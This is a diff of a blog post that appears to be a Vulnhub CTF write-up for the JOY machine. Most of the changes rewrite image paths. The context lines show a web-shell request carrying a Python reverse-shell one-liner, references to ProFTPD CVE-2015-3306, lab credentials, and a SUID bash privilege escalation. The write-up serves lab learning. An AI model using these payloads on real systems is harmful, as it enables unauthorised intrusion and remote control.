@@ -4,9 +4,9 @@ author: yufong
 categories: [Vulnhub, Linux]
 date: 2022-02-11 
 tags: [tcp/22-ftp/exploit,  linux-priv-esc/linux-creds-found, linux-priv-esc/sudo/unknown-exec]
-img_path: /Writeups/Vulnhub/Linux/Digitalworld.local (JOY)/images/
+img_path: /_posts/Writeups/Vulnhub/Linux/Digitalworld.local (JOY)/images/
 image:
-  src: Pasted%20image%2020220208040124.png
+  path: /_posts/Writeups/Vulnhub/Linux/Digitalworld.local (JOY)/images/Pasted%20image%2020220208040124.png
   width: 1000   # in pixels
   height: 400   # in pixels
 ---
@@ -532,11 +532,11 @@ SNIP
 	```
 4. View downloaded files
 	- `directory`
-		![](Pasted%20image%2020220211190947.png)
+		![]({{ page.img_path }}Pasted%20image%2020220211190947.png)
 		- This is patrick's home directory, while enumerating snmp earlier, we found out `TCP/36969 (TFTP)` is also hosting files in patrick's home directory
 		- Therefore, we can access tftp & download all the files in patrick's home directory
 	- Compiled the remaining files
-		![](Pasted%20image%2020220211191126.png)
+		![]({{ page.img_path }}Pasted%20image%2020220211191126.png)
 		- Could be used as a password list
 5. Check for if ProFTPD is vulnerable to `CVE-2015-3306`
 	```
@@ -650,7 +650,7 @@ SNIP
 	└─# cat * >> compiled.txt
 	cat: script: Is a directory
 	```
-	![](Pasted%20image%2020220211193011.png)
+	![]({{ page.img_path }}Pasted%20image%2020220211193011.png)
 		- `ProFTPd 1.3.5`
 		- `/var/www/tryingharderisjoy`
 		- We are able to insert a webshell into `/var/www/tryingharderisjoy` 
@@ -694,8 +694,8 @@ SNIP
 	# Enter this in your web browser
 	192.168.110.26/web_shell.php?c=python+-c+'a=__import__;s=a("socket").socket;o=a("os").dup2;p=a("pty").spawn;c=s();c.connect(("192.168.110.4",4444));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")'
 	```
-	![](Pasted%20image%2020220211202415.png)
-	![](Pasted%20image%2020220211202212.png)
+	![]({{ page.img_path }}Pasted%20image%2020220211202415.png)
+	![]({{ page.img_path }}Pasted%20image%2020220211202212.png)
 
 
 # Privilege Escalation
@@ -711,7 +711,7 @@ SNIP
 	how would these hack3rs ever find such a page?
 	```
 2. Switch to patrick w/ patrick:apollo098765
-	![](Pasted%20image%2020220211203155.png)
+	![]({{ page.img_path }}Pasted%20image%2020220211203155.png)
 
 
 ## Root - Via Sudo 
@@ -748,7 +748,7 @@ SNIP
 	``` 
 	patrick@JOY:~/script$ /tmp/rootbash -p
 	```
-	![](Pasted%20image%2020220211203950.png)
+	![]({{ page.img_path }}Pasted%20image%2020220211203950.png)
 
 6. Root Flag
 
